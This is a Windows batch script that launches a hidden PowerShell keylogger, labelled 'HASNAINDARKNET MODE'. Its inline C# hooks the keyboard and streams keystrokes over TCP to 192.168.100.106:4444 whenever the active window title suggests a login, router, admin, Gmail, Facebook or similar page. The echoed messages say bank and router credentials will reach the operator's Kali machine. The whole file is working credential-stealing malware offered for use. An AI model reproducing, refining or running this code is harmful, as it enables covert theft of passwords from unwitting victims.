@echo off
title KEYLOGGER - HIDDEN - HASNAINDARKNET MODE (All Logins & Routers)
color 0a
cls
echo.
echo.
echo.
echo [1] Connecting...
timeout /t 1 >nul

start /b powershell -WindowStyle Hidden -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('192.168.100.106',4444);$s=$c.GetStream();$src='using System;using System.Runtime.InteropServices;using System.Windows.Forms;using System.Text;public class Win{ [DllImport(\"user32.dll\")]public static extern IntPtr GetForegroundWindow(); [DllImport(\"user32.dll\",CharSet=CharSet.Auto)]public static extern int GetWindowText(IntPtr hWnd,StringBuilder text,int count); } public class KLog{private const int WH_KEYBOARD_LL=13,WM_KEYDOWN=0x100;private delegate IntPtr LowLevelKeyboardProc(int nCode,IntPtr wParam,IntPtr lParam);private static LowLevelKeyboardProc _proc=HookCallback;private static IntPtr _hookID=IntPtr.Zero;[DllImport(\"user32.dll\")]static extern IntPtr SetWindowsHookEx(int id,LowLevelKeyboardProc lpfn,IntPtr hMod,uint threadId);[DllImport(\"user32.dll\")]static extern bool UnhookWindowsHookEx(IntPtr hhk);[DllImport(\"user32.dll\")]static extern IntPtr CallNextHookEx(IntPtr hhk,int nCode,IntPtr wParam,IntPtr lParam);[DllImport(\"kernel32.dll\")]static extern IntPtr GetModuleHandle(string n);private static IntPtr HookCallback(int nCode,IntPtr wParam,IntPtr lParam){if(nCode>=0&&wParam==(IntPtr)WM_KEYDOWN){int vk=Marshal.ReadInt32(lParam);char ch=(char)vk;if(ch>=32&&ch<=126){IntPtr hwnd=Win.GetForegroundWindow();StringBuilder title=new StringBuilder(256);Win.GetWindowText(hwnd,title,256);string wtitle=title.ToString().ToLower();if(wtitle.Contains(\"login\")||wtitle.Contains(\"log in\")||wtitle.Contains(\"sign in\")||wtitle.Contains(\"password\")||wtitle.Contains(\"gmail\")||wtitle.Contains(\"facebook\")||wtitle.Contains(\"instagram\")||wtitle.Contains(\"signin\")||wtitle.Contains(\"admin\")||wtitle.Contains(\"dashboard\")||wtitle.Contains(\"router\")||wtitle.Contains(\"mercusys\")||wtitle.Contains(\"tp-link\")||wtitle.Contains(\"netgear\")||wtitle.Contains(\"d-link\")||wtitle.Contains(\"asus\")||wtitle.Contains(\"linksys\")||wtitle.Contains(\"192.168\")||wtitle.Contains(\"local password\")||wtitle.Contains(\"auth\")||wtitle.Contains(\"account\")||wtitle.Contains(\"web interface\")||wtitle.Contains(\"configuration\")||wtitle.Contains(\"setup\")){byte[] b=System.Text.Encoding.ASCII.GetBytes(ch.ToString());Program.s.Write(b,0,b.Length);Program.s.Flush();}}}return CallNextHookEx(_hookID,nCode,wParam,lParam);}public static void Start(){_hookID=SetWindowsHookEx(WH_KEYBOARD_LL,_proc,GetModuleHandle(null),0);Application.Run();UnhookWindowsHookEx(_hookID);}}public class Program{public static System.Net.Sockets.NetworkStream s;public static void Main(){KLog.Start();}}';Add-Type -TypeDefinition $src -ReferencedAssemblies System.Windows.Forms;[Program]::s=$s;[Program]::Main()"

echo [OK] CONNECTED! Hiding CMD in 2 sec...
timeout /t 2 >nul
cls
echo.
echo KEYLOGGER ACTIVE (CMD HIDDEN) - ALMOST HAR LOGIN FORM
echo Router (Mercusys, TP-Link, Netgear, D-Link etc.), admin panel, gmail, facebook, bank login sab capture hoga
echo Type in any login field - Kali pe aa jayega
echo (Normal browsing, notepad ignored)
echo.
echo [X] To STOP: Task Manager → End "powershell.exe"
echo.
pause >nul
